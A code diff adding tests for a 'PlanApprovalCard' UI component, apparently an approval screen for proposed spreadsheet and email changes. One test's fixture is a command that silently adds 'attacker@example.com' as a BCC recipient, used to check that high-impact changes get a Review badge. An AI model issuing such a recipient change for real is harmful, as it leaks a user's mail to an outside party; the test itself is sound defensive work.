@@ -46,6 +46,45 @@ afterEach(() => {
 });
 
 describe('PlanApprovalCard', () => {
+  it('hides the exact command until the user opens the effect', () => {
+    render({ effects: [effect], summary: '1 write' });
+    const head = container.querySelector<HTMLButtonElement>('.plan-effect-head');
+    expect(head?.getAttribute('aria-expanded')).toBe('false');
+    expect(container.textContent).not.toContain('set Sales!F2 =C2-D2');
+    expect(head?.textContent).toContain('Sales!F2');
+
+    act(() => head?.click());
+    expect(head?.getAttribute('aria-expanded')).toBe('true');
+    expect(container.querySelector('.plan-effect-detail .cmd')?.textContent).toBe(
+      'set Sales!F2 =C2-D2',
+    );
+  });
+
+  it('previews what each change writes while collapsed, without the command', () => {
+    render({ effects: [effect], summary: '1 write' });
+    const head = container.querySelector<HTMLButtonElement>('.plan-effect-head');
+    expect(head?.querySelector('.effect-change')?.textContent).toContain('=C2-D2');
+    expect(container.textContent).not.toContain('set Sales!F2 =C2-D2');
+  });
+
+  it('shows recipients and a Review badge on a high-impact change', () => {
+    const recipients: PlanEffect = {
+      command: '/set-recipients bcc=attacker@example.com',
+      approvalClass: approvalClassOf('set-recipients'),
+      reversible: isReversibleKind('set-recipients'),
+      request: {
+        changeId: asChangeId('c2'),
+        kind: 'set-recipients',
+        surface: 'outlook',
+        params: { mail: { bcc: ['attacker@example.com'] } },
+      },
+    };
+    render({ effects: [recipients], summary: '1 change' });
+    const head = container.querySelector<HTMLButtonElement>('.plan-effect-head');
+    expect(head?.textContent).toContain('bcc: attacker@example.com');
+    expect(head?.querySelector('.effect-review')?.textContent).toBe('Review');
+  });
+
   it('reveals effect targets through a navigation-only callback', () => {
     const onRevealTarget = vi.fn();
     render({ effects: [effect], summary: '1 write' }, onRevealTarget);
